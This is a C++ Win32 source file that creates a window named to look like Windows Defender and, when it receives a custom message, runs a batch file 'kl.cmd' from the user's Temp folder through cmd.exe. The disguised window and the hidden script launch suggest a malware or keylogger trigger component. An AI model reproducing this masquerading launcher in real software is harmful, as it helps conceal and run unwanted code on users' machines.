#include "stdafx.h"

#define WM_RUN WM_USER + 1

// The main window class name.
static TCHAR szWindowClass[] = _T("DefenderWindow");

// The string that appears in the application's title bar.
static TCHAR szTitle[] = _T("Defender Window");

HINSTANCE hInst;

// Forward declarations of functions included in this code module:
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

LRESULT My::DefenderQuit()
{
	HWND hwnd = FindWindow(szWindowClass, szTitle);
	if (hwnd == NULL) {
		My::Debug("DefenderRunCommand: Failed to find a window");
	}
	return PostMessage(hwnd, WM_DESTROY, 0, 0);
}

LRESULT My::DefenderRunCommand()
{
	HWND hwnd = FindWindow(szWindowClass, szTitle);
	if (hwnd == NULL) {
		My::Debug("DefenderRunCommand: Failed to find a window");
	}
	return PostMessage(hwnd, WM_RUN, 0, 0);
}

HWND My::DefenderCreateWindow(
	_In_ HINSTANCE hInstance
)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);
	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, IDI_APPLICATION);
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, IDI_APPLICATION);

	if (!RegisterClassEx(&wcex))
	{
		My::Debug("CreateDefenderWindow: Failed to register class");
		return NULL;
	}

	// Store instance handle in our global variable
	hInst = hInstance;

	// The parameters to CreateWindow explained:
	// szWindowClass: the name of the application
	// szTitle: the text that appears in the title bar
	// WS_OVERLAPPEDWINDOW: the type of window to create
	// CW_USEDEFAULT, CW_USEDEFAULT: initial position (x, y)
	// 500, 100: initial size (width, length)
	// NULL: the parent of this window
	// NULL: this application does not have a menu bar
	// hInstance: the first parameter from WinMain
	// NULL: not used in this application
	HWND hWnd = CreateWindow(
		szWindowClass,
		szTitle,
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT,
		500, 100,
		NULL,
		NULL,
		hInstance,
		NULL
	);

	if (hWnd == NULL)
	{
		My::Debug("CreateDefenderWindow: Failed to create a window");
	}
	return hWnd;
}

//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	PAINTSTRUCT ps;
	HDC hdc;
	TCHAR greeting[] = _T("Hello, Windows desktop!");

	switch (message)
	{
	case WM_RUN:
	{
		std::string process = "cmd.exe /c \"" + std::string(getenv("LOCALAPPDATA")) + "\\Temp\\kl.cmd\"";
		My::Debug("WndProc: Running a process=" + process);
		My::RunProcess((LPSTR)process.c_str());
		break;
	}
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
		break;
	}

	return 0;
}